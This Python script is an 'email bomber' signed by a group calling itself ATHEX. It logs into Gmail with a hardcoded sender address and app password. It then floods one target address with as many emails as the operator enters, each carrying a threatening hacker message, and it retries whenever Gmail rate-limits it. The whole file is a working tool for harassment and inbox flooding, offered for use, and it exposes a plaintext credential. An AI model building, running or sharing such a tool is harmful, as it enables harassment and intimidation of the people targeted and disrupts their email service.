import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
from colorama import Fore, Style, init

init(autoreset=True)

SENDER_EMAIL = "tyranrootcyber@gmail.com"
SENDER_PASSWORD = "ofly uoqo drhw yatq"

SUBJECTS = [
    "TEAM ATHEX",
] + [f"ATHEX {i}" for i in range(21, 501)]

def send_emails(recipient_email, num_emails):
    message_body = "Your security is an illusion.Your data is now our asset.Your systems have been marked.We move in shadows, strike without warning.Led by ATHEX, we don't make requests—we make statements.Ignore this at your own peril.TEAM ATHEX.Where others see walls, we see doors."

    try:
        print(f"{Fore.CYAN}{Style.BRIGHT}[+] Connecting to Gmail SMTP as {SENDER_EMAIL}...")
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        print(f"{Fore.GREEN}{Style.BRIGHT}[✓] Logged in successfully.\n")
    except smtplib.SMTPAuthenticationError:
        print(f"{Fore.RED}{Style.BRIGHT}[❌] Login failed! Please check your Gmail App Password.")
        print(f"{Fore.YELLOW}➡ Make sure 2-Step Verification is ON and you're using an App Password without spaces.")
        return
    except Exception as e:
        print(f"{Fore.RED}{Style.BRIGHT}[❌] Could not connect to Gmail SMTP: {e}")
        return

    start_time = time.time()

    for i in range(num_emails):
        try:
            msg = MIMEMultipart()
            msg["From"] = SENDER_EMAIL
            msg["To"] = recipient_email
            msg["Subject"] = SUBJECTS[i % len(SUBJECTS)]
            msg.attach(MIMEText(message_body, "plain"))

            server.sendmail(SENDER_EMAIL, recipient_email, msg.as_string())
            print(f"{Fore.GREEN}{Style.BRIGHT}[✓] Sent email {i+1}/{num_emails} with subject: {msg['Subject']}")

            time.sleep(0.1) 

        except smtplib.SMTPResponseException as e:
            if e.smtp_code == 421:
                print(f"{Fore.YELLOW}{Style.BRIGHT}[⚠] Gmail rate-limited. Waiting 2 seconds...")
                time.sleep(2)
                continue
            else:
                print(f"{Fore.RED}[!] SMTP error sending email {i+1}: {e.smtp_error}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error sending email {i+1}: {e}")

    end_time = time.time()
    print(f"\n{Fore.CYAN}{Style.BRIGHT}[✓] Finished sending {num_emails} emails in {end_time - start_time:.2f} seconds.")

    server.quit()

if __name__ == "__main__":
    print(f"{Fore.MAGENTA}{Style.BRIGHT}")
    print("███████╗███╗   ███╗ █████╗ ██╗██╗    ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗                 ")
    print("██╔════╝████╗ ████║██╔══██╗██║██║    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗                ")
    print("█████╗  ██╔████╔██║███████║██║██║    ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝                ")
    print("██╔══╝  ██║╚██╔╝██║██╔══██║██║██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗                ")
    print("███████╗██║ ╚═╝ ██║██║  ██║██║██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║                ")
    print("╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝    By A T H E X")
    print(f"{Style.RESET_ALL}")
    
    recipient_email = input(f"{Fore.CYAN}Enter recipient Gmail: {Style.RESET_ALL}")
    num_emails = int(input(f"{Fore.CYAN}Enter number of emails to send: {Style.RESET_ALL}"))
    send_emails(recipient_email, num_emails)
